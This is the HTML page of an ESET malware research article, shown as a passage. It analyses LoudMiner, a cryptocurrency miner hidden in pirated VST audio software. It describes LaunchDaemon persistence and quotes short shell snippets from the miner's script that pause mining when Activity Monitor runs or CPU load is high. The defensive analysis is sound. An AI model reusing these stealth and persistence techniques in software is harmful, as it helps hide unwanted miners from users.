<!doctype html>
<html lang="en-US" prefix="og: http://ogp.me/ns#">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
    <meta name="viewport" content="width=device-width, initial-scale=1"/>
    <meta name="google-site-verification" content="_b2avZwzr79oru6lM2Ddae1fNpSIbPaP0H0WNkc2x3k"/>
    <meta name="msvalidate.01" content="CE77828A466C2513F660017CFCB6BA13"/>
    <link rel="icon" href="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/favicon.ico">

    

            
    
    <link href="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/build/css/main-8633bd3c28.css" rel="stylesheet">
    <script type="text/javascript"> var appInsights=window.appInsights||function(a){ function b(a){c[a]=function(){var b=arguments;c.queue.push(function(){c[a].apply(c,b)})}}var c={config:a},d=document,e=window;setTimeout(function(){var b=d.createElement("script");b.src=a.url||"https://az416426.vo.msecnd.net/scripts/a/ai.0.js",d.getElementsByTagName("script")[0].parentNode.appendChild(b)});try{c.cookie=d.cookie}catch(a){}c.queue=[];for(var f=["Event","Exception","Metric","PageView","Trace","Dependency"];f.length;)b("track"+f.pop());if(b("setAuthenticatedUserContext"),b("clearAuthenticatedUserContext"),b("startTrackEvent"),b("stopTrackEvent"),b("startTrackPage"),b("stopTrackPage"),b("flush"),!a.disableExceptionTracking){f="onerror",b("_"+f);var g=e[f];e[f]=function(a,b,d,e,h){var i=g&&g(a,b,d,e,h);return!0!==i&&c["_"+f](a,b,d,e,h),i}}return c }({ instrumentationKey:"dcb460fe-684e-4d39-bfcd-d3a6f2710a32" }); window.appInsights=appInsights,appInsights.queue&&0===appInsights.queue.length&&appInsights.trackPageView(); </script>
    <script>
        window.dataLayer = window.dataLayer || [];
    window.dataLayer.push({
        'Author': 'Michal Malik',
        'ArticleCategory': 'Malware',
        'ArticleSection': 'Research',
        'cookie-bar-hq': true
    });

    (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
        new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
        j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
        'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
    })(window,document,'script','dataLayer','GTM-PMDGSM');
</script>
<script>(function() {
  var _fbq = window._fbq || (window._fbq = []);
  if (!_fbq.loaded) {
    var fbds = document.createElement('script');
    fbds.async = true;
    fbds.src = '//connect.facebook.net/en_US/fbds.js';
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(fbds, s);
    _fbq.loaded = true;
  }
  _fbq.push(['addPixelId', '1518099328403839']);
})();
window._fbq = window._fbq || [];
window._fbq.push(['track', 'PixelInitialized', {}]);
</script>
<noscript><img height="1" width="1" alt="" style="display:none" src="https://www.facebook.com/tr?id=1518099328403839&amp;ev=NoScript" /></noscript>
<meta property="fb:pages" content="56844830907" />
<!-- This site is optimized with the Yoast SEO plugin v9.2 - https://yoast.com/wordpress/plugins/seo/ -->
<title>LoudMiner: Cross&#8209;platform mining in cracked VST software | WeLiveSecurity</title>
<meta name="description" content="ESET researchers have uncovered an unusual miner that comes bundled with pirated copies of VST audio software and mines cryptocurrency on virtual machines."/>
<link rel="canonical" href="https://www.welivesecurity.com/2019/06/20/loudminer-mining-cracked-vst-software/" />
<meta property="og:locale" content="en_US" />
<meta property="og:locale:alternate" content="fr_FR" />
<meta property="og:locale:alternate" content="de_DE" />
<meta property="og:type" content="article" />
<meta property="og:title" content="LoudMiner: Cross&#8209;platform mining in cracked VST software | WeLiveSecurity" />
<meta property="og:description" content="ESET researchers have uncovered an unusual miner that comes bundled with pirated copies of VST audio software and mines cryptocurrency on virtual machines." />
<meta property="og:url" content="https://www.welivesecurity.com/2019/06/20/loudminer-mining-cracked-vst-software/" />
<meta property="og:site_name" content="WeLiveSecurity" />
<meta property="article:section" content="Malware" />
<meta property="article:published_time" content="2019-06-20T09:00:32+00:00" />
<meta property="article:modified_time" content="2019-06-20T09:49:12+00:00" />
<meta property="og:updated_time" content="2019-06-20T09:49:12+00:00" />
<meta property="og:image" content="https://www.welivesecurity.com/wp-content/uploads/2019/06/LoudMiner-thumbnail-2-e1561024142524.jpg" />
<meta property="og:image:secure_url" content="https://www.welivesecurity.com/wp-content/uploads/2019/06/LoudMiner-thumbnail-2-e1561024142524.jpg" />
<meta property="og:image:width" content="933" />
<meta property="og:image:height" content="700" />
<meta name="twitter:card" content="summary" />
<meta name="twitter:description" content="ESET researchers have uncovered an unusual miner that comes bundled with pirated copies of VST audio software and mines cryptocurrency on virtual machines." />
<meta name="twitter:title" content="LoudMiner: Cross&#8209;platform mining in cracked VST software | WeLiveSecurity" />
<meta name="twitter:site" content="@welivesecurity" />
<meta name="twitter:image" content="https://www.welivesecurity.com/wp-content/uploads/2019/06/LoudMiner-thumbnail-2-e1561024142524.jpg" />
<meta name="twitter:creator" content="@welivesecurity" />
<!-- / Yoast SEO plugin. -->

<link rel='stylesheet' id='crayon-theme-classic-css'  href='https://www.welivesecurity.com/wp-content/plugins/crayon-syntax-highlighter/themes/classic/classic.css?ver=_2.7.2_beta' type='text/css' media='all' />
<link rel='stylesheet' id='crayon-font-monaco-css'  href='https://www.welivesecurity.com/wp-content/plugins/crayon-syntax-highlighter/fonts/monaco.css?ver=_2.7.2_beta' type='text/css' media='all' />
<link rel="alternate" href="https://www.welivesecurity.com/fr/2019/06/21/loudminer-exploitation-miniere-vst/" hreflang="fr" />
<link rel="alternate" href="https://www.welivesecurity.com/2019/06/20/loudminer-mining-cracked-vst-software/" hreflang="en" />
<link rel="alternate" href="https://www.welivesecurity.com/la-es/2019/06/24/loudminer-minero-multiplataforma-oculto-programas-vst-crackeados/" hreflang="es" />
<link rel="alternate" href="https://www.welivesecurity.com/deutsch/2019/06/20/loudminer-plattformuebergreifender-crypto-trojaner-in-gecrackter-vst-software/" hreflang="de" />
<link rel="alternate" type="application/rss+xml" title="WeLiveSecurity RSS 2.0 Feed" href="/rss-configurator/" /><style type="text/css" id="syntaxhighlighteranchor"></style>
        <link id="cookie-style" rel="stylesheet" type="text/css" href="https://assets.esetstatic.com/3PS/cookiebar.min.css">
</head>
<body class="no-js single wide">
<noscript>
	<iframe src="https://www.googletagmanager.com/ns.html?id=GTM-PMDGSM" height="0" width="0" style="display:none;visibility:hidden"></iframe>
</noscript>
<div id="fb-root"></div>
<script>(function(d, s, id) {
  var js, fjs = d.getElementsByTagName(s)[0];
  if (d.getElementById(id)) return;
  js = d.createElement(s); js.id = id;
  js.src = "//connect.facebook.net/en_US/sdk.js#xfbml=1&version=v2.3";
  fjs.parentNode.insertBefore(js, fjs);
}(document, 'script', 'facebook-jssdk'));</script>
<div class="main">
    <header id="site-header" class="container">
        <div class="row">
            <div class="col-md-4 col-sm-12 col-xs-12 pull-right" id="header-nav">
                <div class="row">
                    <div class="col-xs-12 mobile-search-input">
                        <form action="https://www.welivesecurity.com/" class="basic-searchform imc dark col-md-12 col-sm-10 col-xs-12" method="get" role="search">
	<div class="search-input clearfix">
		<input type="text" name="s" value="" placeholder="Search..." class="imc">
		<button class="imc">
			<span class="icomoon icon-icon_search imc"></span>
		</button>
	</div>
</form>	                    </div>
                    <div class="hidden-lg hidden-md col-sm-7 col-xs-8 hidden-xxs">
                        <div class="logo-wrapper clearfix">
    <div class="dark clearfix">
        <a href="https://www.welivesecurity.com/" class="wls">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-dark-header-1.svg" alt="Welivesecurity.com">
        </a>
        <a href="https://www.eset.com" class="eset">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-dark-header-2.svg" alt="by ESET">
        </a>
    </div>
    <div class="light clearfix">
        <a href="https://www.welivesecurity.com/" class="wls">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-light-header-1.svg" alt="Welivesecurity.com">
        </a>
        <a href="https://www.eset.com" class="eset">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-light-header-2.svg" alt="by ESET">
        </a>
    </div>
</div>                    </div>
                    <div class="col-md-8 hidden-sm hidden-xs languages">
                        <div class="dropdown">
	<button class="btn btn-default dropdown-toggle" type="button" id="main-language-picker" data-toggle="dropdown" aria-haspopup="true" aria-expanded="true">
    	<span class="text">In English</span>
    	<span class="icomoon icon-icon_arrow"></span>
  	</button>
  	<ul class="dropdown-menu" aria-labelledby="main-language-picker">
            <li>
        <a href="/br/" title="Em Português">
            Em Português        </a>
    </li>
        <li>
        <a href="/fr/2019/06/21/loudminer-exploitation-miniere-vst/" title="En français">
            En français        </a>
    </li>
        <li>
        <a href="/la-es/2019/06/24/loudminer-minero-multiplataforma-oculto-programas-vst-crackeados/" title="En Español">
            En Español        </a>
    </li>
        <li>
        <a href="/deutsch/2019/06/20/loudminer-plattformuebergreifender-crypto-trojaner-in-gecrackter-vst-software/" title="In Deutsch">
            In Deutsch        </a>
    </li>
      	</ul>
</div>                    </div>
                    <div class="col-md-4 col-sm-2 col-xs-3 menu-trigger">
                        <div class="menu-btn">
	<span class="text">Menu</span>
	<button type="button" id="menu-trigger" class="tcon tcon-menu--xcross" aria-label="toggle menu">
        <span class="wrapper">
            <span class="tcon-menu__lines" aria-hidden="true"></span>
            <span class="tcon-visuallyhidden">toggle menu</span>
        </span>
    </button>
</div>                    </div>
                    <div class="hidden-lg hidden-md hidden-sm hidden-xs col-xs-2 mobile-search imc">
                        <button class="imc">
                            <span class="icomoon icon-icon_search imc"></span>
                        </button>
                    </div>
                    <div class="col-md-12 col-sm-12 col-xs-12 imc" id="main-menu">
                        <nav class="menu clearfix imc">
                            <ul class="col-md-12 col-sm-6 col-xs-6 imc">
                                                                    <li class="">
                                        <a href="/">
                                            All Posts                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="/research">
                                            Research                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="/category/how-to/">
                                            How To                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="https://www.welivesecurity.com/media/videos/">
                                            Videos                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="https://www.welivesecurity.com/media/podcasts/">
                                            Podcasts                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="https://www.welivesecurity.com/papers/conference-papers/">
                                            Conference Materials                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="https://www.welivesecurity.com/papers/white-papers/">
                                            White Papers                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="https://www.welivesecurity.com/papers/threat-reports/">
                                            Threat Reports                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="https://www.welivesecurity.com/papers/magazine/">
                                            Magazine                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="https://www.welivesecurity.com/our-experts/">
                                            Our Experts                                        </a>
                                    </li>
                                                            </ul>

                            <div class="col-md-12 col-sm-6 col-xs-6 imc">
                                <ul class="languages hidden-lg hidden-md hidden-xxs col-xs-12 imc">
                                        <li>
        <a href="/br/" title="Em Português">
            Em Português        </a>
    </li>
        <li>
        <a href="/fr/2019/06/21/loudminer-exploitation-miniere-vst/" title="En français">
            En français        </a>
    </li>
        <li>
        <a href="/la-es/2019/06/24/loudminer-minero-multiplataforma-oculto-programas-vst-crackeados/" title="En Español">
            En Español        </a>
    </li>
        <li>
        <a href="/deutsch/2019/06/20/loudminer-plattformuebergreifender-crypto-trojaner-in-gecrackter-vst-software/" title="In Deutsch">
            In Deutsch        </a>
    </li>
                                    </ul>
                                <div class="hidden-lg hidden-md col-xs-12 imc">
                                    <form action="https://www.welivesecurity.com/" class="basic-searchform imc dark col-md-12 col-sm-10 col-xs-12" method="get" role="search">
	<div class="search-input clearfix">
		<input type="text" name="s" value="" placeholder="Search..." class="imc">
		<button class="imc">
			<span class="icomoon icon-icon_search imc"></span>
		</button>
	</div>
</form>	                                </div>
                            </div>
                        </nav>
                    </div>
                    <div class="menu-overlay col-md-12 col-sm-12 col-xs-12 imc">
                        <div class="inner imc"></div>
                    </div>
                </div>
                <div class="row hidden-sm hidden-xs">
                    <form action="https://www.welivesecurity.com/" class="basic-searchform imc  col-md-12 col-sm-10 col-xs-12" method="get" role="search">
	<div class="search-input clearfix">
		<input type="text" name="s" value="" placeholder="Search..." class="imc">
		<button class="imc">
			<span class="icomoon icon-icon_search imc"></span>
		</button>
	</div>
</form>	                </div>
            </div>
            <div class="col-md-5 hidden-sm hidden-xs pull-left" id="header-logo">
                <div class="logo-wrapper clearfix">
    <div class="dark clearfix">
        <a href="https://www.welivesecurity.com/" class="wls">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-dark-header-1.svg" alt="Welivesecurity.com">
        </a>
        <a href="https://www.eset.com" class="eset">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-dark-header-2.svg" alt="by ESET">
        </a>
    </div>
    <div class="light clearfix">
        <a href="https://www.welivesecurity.com/" class="wls">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-light-header-1.svg" alt="Welivesecurity.com">
        </a>
        <a href="https://www.eset.com" class="eset">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-light-header-2.svg" alt="by ESET">
        </a>
    </div>
</div>                <span class="slogan hidden-sm hidden-xs">
						Award-winning news, views, and insight from the ESET <strong>security community</strong> 
					</span>
            </div>
        </div>
    </header>
        <section id="article-detail">
            <div class="hero-wide" style="background-image: url('../../../../wp-content/uploads/2019/06/3d-sound.jpg'); background-position: 50% 50%;">
    <div class="text-wrapper">
        <div class="container promo-text">
            <div class="col-md-11 col-sm-11 col-xs-12 no-padding">
                <h1>LoudMiner: Cross&#8209;platform mining in cracked VST software</h1>
<div class="excerpt">The story of a Linux miner bundled with pirated copies of VST (Virtual Studio Technology) software for Windows and macOS</div>
<div class="post-meta">
    <div class="wls-authors">
                <div class="wls-author with-avatar">
                            <div class="wls-author-avatar">
                    <a href="https://www.welivesecurity.com/author/mmalik/" title="Michal Malik">
                        <img src="https://www.welivesecurity.com/wp-content/uploads/2016/03/Malik_Michal-222x179.jpg" alt="Michal Malik">
                    </a>
                </div>
                        <div class="wls-author-name">
                <a href="https://www.welivesecurity.com/author/mmalik/" title="Michal Malik">
                    Michal Malik                </a>
            </div>
        </div>
                <div class="wls-author with-avatar">
                            <div class="wls-author-avatar">
                    <a href="https://www.welivesecurity.com/author/esetresearch/" title="ESET Research">
                        <img src="https://www.welivesecurity.com/wp-content/uploads/2020/04/android-fullpage-1024x576-Copy-222x179.jpg" alt="ESET Research">
                    </a>
                </div>
                        <div class="wls-author-name">
                <a href="https://www.welivesecurity.com/author/esetresearch/" title="ESET Research">
                    ESET Research                </a>
            </div>
        </div>
            </div>
    <span class="meta">
		<span class="strong">
			<time datetime="2019-06-20 11:00:32">20 Jun 2019 - 11:00AM</time>
		</span>
			</span>
</div>
            </div>
        </div>
    </div>
</div>

            <div class="content">
                <div class="social-wrapper" id="social-sharer">
                    <span class="text">Share</span>
	<a class="share-facebook" href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fwww.welivesecurity.com%2F2019%2F06%2F20%2Floudminer-mining-cracked-vst-software%2F" target="blank" data-toggle="tooltip" data-placement="top" data-original-title="Share on Facebook">
		<span class="icomoon icon-icon_fb"></span>
	</a>
	<a class="share-twitter" href="https://twitter.com/intent/tweet?&url=https%3A%2F%2Fwww.welivesecurity.com%2F2019%2F06%2F20%2Floudminer-mining-cracked-vst-software%2F&text=LoudMiner: Cross&#8209;platform mining in cracked VST software%0A&via=welivesecurity" target="blank" data-toggle="tooltip" data-placement="top" data-original-title="Share on Twitter">
		<span class="icomoon icon-icon_tw"></span>
	</a>
	<a class="share-linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3A%2F%2Fwww.welivesecurity.com%2F2019%2F06%2F20%2Floudminer-mining-cracked-vst-software%2F" target="blank" data-toggle="tooltip" data-placement="top" data-original-title="Share on Linkedin">
		<span class="icomoon icon-icon_in"></span>
	</a>
                </div>
                <div class="container">
                    <div class="row">
                        <div class="col-md-1 col-sm-1 hidden-xs">

                        </div>
                        <div class="col-md-10 col-sm-10 col-xs-12 formatted">

                            <div class="excerpt wide">
                                <p>The story of a Linux miner bundled with pirated copies of VST (Virtual Studio Technology) software for Windows and macOS</p>
                            </div>

                            <h1>Introduction</h1>
<p>LoudMiner is an unusual case of a persistent cryptocurrency miner, distributed for macOS and Windows since August 2018. It uses virtualization software – QEMU on macOS and VirtualBox on Windows – to mine cryptocurrency on a <a href="https://distro.ibiblio.org/tinycorelinux/" target="_blank" rel="noopener">Tiny Core Linux</a> virtual machine, making it cross platform. It comes bundled with pirated copies of <a href="https://en.wikipedia.org/wiki/Virtual_Studio_Technology" target="_blank" rel="noopener">VST</a> software. The miner itself is based on <a href="https://github.com/xmrig/xmrig" target="_blank" rel="noopener">XMRig</a> (Monero) and uses a mining pool, thus it is impossible to retrace potential transactions.</p>
<h1>Distribution</h1>
<p>At the time of writing, there are 137 VST-related applications (42 for Windows and 95 for macOS) available on a single WordPress-based website with a domain registered on 24 August, 2018. The first application – Kontakt Native Instruments 5.7 for Windows – was uploaded on the same day. The size of the apps makes it impractical to analyze them all, but it seems safe to assume they are all Trojanized.</p>
<p>The applications themselves are not hosted on the WordPress-based site, but on 29 external servers, which can be found in the IoCs section. The admins of the site also frequently update the applications with newer versions, making it difficult to track the very first version of the miner.</p>
<p>Regarding the nature of the applications targeted, it is interesting to observe that their purpose is related to audio production; thus, the machines that they are installed on should have good processing power and high CPU consumption will not surprise the users. Also, these applications are usually complex, so it is not unexpected for them to be huge files. The attackers use this to their advantage to camouflage their VM images. Moreover, the decision to use virtual machines instead of a leaner solution is quite remarkable and this is not something we routinely see.</p>
<p>Here are some examples of applications, as well as some comments you can find on the website:</p>
<ul>
<li>Propellerhead Reason</li>
<li>Ableton Live</li>
<li>Sylenth1</li>
<li>Nexus</li>
<li>Reaktor 6</li>
<li>AutoTune</li>
</ul>
<div id="attachment_127056" style="width: 760px" class="wp-caption aligncenter"><a href="/wp-content/uploads/2019/06/Figure-1-1.png"><img class="wp-image-127056" src="/wp-content/uploads/2019/06/Figure-1-1.png" alt="" width="750" height="343" srcset="https://www.welivesecurity.com/wp-content/uploads/2019/06/Figure-1-1.png 901w, https://www.welivesecurity.com/wp-content/uploads/2019/06/Figure-1-1-300x137.png 300w, https://www.welivesecurity.com/wp-content/uploads/2019/06/Figure-1-1-768x351.png 768w" sizes="(max-width: 750px) 100vw, 750px" /></a><p class="wp-caption-text"><i>Figure 1. Comment #1 from the &#8220;admin</i></p></div>
<div id="attachment_127057" style="width: 760px" class="wp-caption aligncenter"><a href="/wp-content/uploads/2019/06/Figure-2-2.png"><img class="wp-image-127057" src="/wp-content/uploads/2019/06/Figure-2-2.png" alt="" width="750" height="345" srcset="https://www.welivesecurity.com/wp-content/uploads/2019/06/Figure-2-2.png 844w, https://www.welivesecurity.com/wp-content/uploads/2019/06/Figure-2-2-300x138.png 300w, https://www.welivesecurity.com/wp-content/uploads/2019/06/Figure-2-2-768x353.png 768w" sizes="(max-width: 750px) 100vw, 750px" /></a><p class="wp-caption-text"><i>Figure 2. Comment #2 from the &#8220;admin&#8221;</i></p></div>
<h1>User reports</h1>
<p>We found several forum threads of users complaining about a <em>qemu-system-x86_64 </em>process taking 100% of their CPU on their Mac:</p>
<div id="attachment_127058" style="width: 760px" class="wp-caption aligncenter"><a href="/wp-content/uploads/2019/06/Figure-3-1.png"><img class="wp-image-127058" src="/wp-content/uploads/2019/06/Figure-3-1-1024x606.png" alt="" width="750" height="444" srcset="https://www.welivesecurity.com/wp-content/uploads/2019/06/Figure-3-1-1024x606.png 1024w, https://www.welivesecurity.com/wp-content/uploads/2019/06/Figure-3-1-300x177.png 300w, https://www.welivesecurity.com/wp-content/uploads/2019/06/Figure-3-1-768x454.png 768w, https://www.welivesecurity.com/wp-content/uploads/2019/06/Figure-3-1.png 1065w" sizes="(max-width: 750px) 100vw, 750px" /></a><p class="wp-caption-text"><i>Figure 3. User report #1 (https://discussions.apple.com/thread/250064603)</i></p></div>
<div id="attachment_127059" style="width: 760px" class="wp-caption aligncenter"><a href="/wp-content/uploads/2019/06/Figure-4-1.png"><img class="wp-image-127059" src="/wp-content/uploads/2019/06/Figure-4-1.png" alt="" width="750" height="712" srcset="https://www.welivesecurity.com/wp-content/uploads/2019/06/Figure-4-1.png 947w, https://www.welivesecurity.com/wp-content/uploads/2019/06/Figure-4-1-300x285.png 300w, https://www.welivesecurity.com/wp-content/uploads/2019/06/Figure-4-1-768x729.png 768w" sizes="(max-width: 750px) 100vw, 750px" /></a><p class="wp-caption-text"><i>Figure 4. User report #2 (https://toster.ru/q/608325)</i></p></div>
<p>A user named “Macloni” (<a href="https://discussions.apple.com/thread/8602989" target="_blank" rel="noopener">https://discussions.apple.com/thread/8602989</a>) said the following:</p>
<p>“Unfortunately, had to reinstall OSX, the problem was that Ableton Live 10, which I have downloaded it from a torrent site and not from the official site, installs a miner too, running at the background causing this.” The same user attached screenshots of the Activity Monitor indicating 2 processes – <span style="font-family: courier new, courier, monospace;">qemu-system-x86_64</span> and <span style="font-family: courier new, courier, monospace;">tools-service</span> – taking 25% of CPU resources and running as root.”</p>
<h1>Analysis of pirated applications</h1>
<p>The general idea of both macOS and Windows analyses stays the same:</p>
<ol>
<li>An application is bundled with virtualization software, a Linux image and additional files used to achieve persistence.</li>
<li>User downloads the application and follows attached instructions on how to install it.</li>
<li>LoudMiner is installed first, the actual VST software after.</li>
<li>LoudMiner hides itself and becomes persistent on reboot.</li>
<li>The Linux virtual machine is launched and the mining starts.</li>
<li>Scripts inside the virtual machine can contact the C&amp;C server to update the miner (configuration and binaries).</li>
</ol>
<p>While analyzing the different applications, we’ve identified four versions of the miner, mostly based on how it’s bundled with the actual software, the C&amp;C server domain, and something we believe is a version string created by the author.</p>
<h2>macOS</h2>
<p>We’ve identified three macOS versions of this malware so far. All of them include dependencies needed to run QEMU in <span style="font-family: courier new, courier, monospace;">installerdata.dmg</span> from which all files are copied over to <span style="font-family: courier new, courier, monospace;">/usr/local/bin</span> and have appropriate permissions set along the way. Each version of the miner can run two images at once, each taking 128 MB of RAM and one CPU core. Persistence is achieved by adding plist files in <span style="font-family: courier new, courier, monospace;">/Library/LaunchDaemons</span> with <span style="font-family: courier new, courier, monospace;">RunAtLoad</span> set to <span style="font-family: courier new, courier, monospace;">true</span>. They also have <span style="font-family: courier new, courier, monospace;">KeepAlive</span> set to true<em>, </em>ensuring the process will be restarted if stopped. Each version has these components:</p>
<ol>
<li>QEMU Linux images.</li>
<li>Shell scripts used to launch the QEMU images.</li>
<li>Daemons used to start the shell scripts at boot and keep them running.</li>
<li>A CPU monitor shell script with an accompanying daemon that can start/stop the mining based on CPU usage and whether the <span style="font-family: courier new, courier, monospace;">Activity Monitor</span> process is running.</li>
</ol>
<p>The CPU monitor script can start and stop the mining by loading and unloading the daemon. If the <span style="font-family: courier new, courier, monospace;">Activity Monitor</span> process is running, the mining stops. Otherwise, it checks for how long the system has been idle in seconds:</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60a9a94431f44634136336" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
ioreg -c IOHIDSystem | awk '/HIDIdleTime/ {print $NF/1000000000; exit}'</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="hide">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60a9a94431f44634136336-1">1</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60a9a94431f44634136336-1"><span class="crayon-v">ioreg</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">c</span><span class="crayon-h"> </span><span class="crayon-v">IOHIDSystem</span><span class="crayon-h"> </span><span class="crayon-o">|</span><span class="crayon-h"> </span><span class="crayon-i">awk</span><span class="crayon-h"> </span><span class="crayon-s">'/HIDIdleTime/ {print $NF/1000000000; exit}'</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0001 seconds] -->
<p>If it’s been longer than 2 minutes, it starts the mining. If it’s been less than 2 minutes, it checks the total CPU usage:</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60a9a94431f4d331850566" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
ps -A -o %cpu | awk '{s+=$1} END {print s }'</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="hide">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60a9a94431f4d331850566-1">1</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60a9a94431f4d331850566-1"><span class="crayon-v">ps</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-v">A</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-v">o</span><span class="crayon-h"> </span><span class="crayon-o">%</span><span class="crayon-v">cpu</span><span class="crayon-h"> </span><span class="crayon-o">|</span><span class="crayon-h"> </span><span class="crayon-i">awk</span><span class="crayon-h"> </span><span class="crayon-s">'{s+=$1} END {print s }'</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0001 seconds] -->
<p>divides that by the number of CPU cores:</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60a9a94431f4f737459140" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
sysctl hw.logicalcpu |awk '{print $2 }')</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="hide">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60a9a94431f4f737459140-1">1</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60a9a94431f4f737459140-1"><span class="crayon-e">sysctl </span><span class="crayon-v">hw</span><span class="crayon-sy">.</span><span class="crayon-v">logicalcpu</span><span class="crayon-h"> </span><span class="crayon-o">|</span><span class="crayon-i">awk</span><span class="crayon-h"> </span><span class="crayon-s">'{print $2 }'</span><span class="crayon-sy">)</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0000 seconds] -->
<p>and if it’s greater than 85%, it stops the mining. The script itself is a bit different across versions, but the general idea stays the same.</p>
<p>After the installation is done, all miner-related installation files are deleted.</p>
<div id="attachment_127060" style="width: 760px" class="wp-caption aligncenter"><a href="/wp-content/uploads/2019/06/Figure-5-1.png"><img class="wp-image-127060" src="/wp-content/uploads/2019/06/Figure-5-1.png" alt="" width="750" height="392" srcset="https://www.welivesecurity.com/wp-content/uploads/2019/06/Figure-5-1.png 776w, https://www.welivesecurity.com/wp-content/uploads/2019/06/Figure-5-1-300x157.png 300w, https://www.welivesecurity.com/wp-content/uploads/2019/06/Figure-5-1-768x402.png 768w" sizes="(max-width: 750px) 100vw, 750px" /></a><p class="wp-caption-text"><i>Figure 5. Installation of <span style="font-family: courier new, courier, monospace;">Polyverse.Music.Manipulator.v1.0.1.macOS.dmg</span></i></p></div>
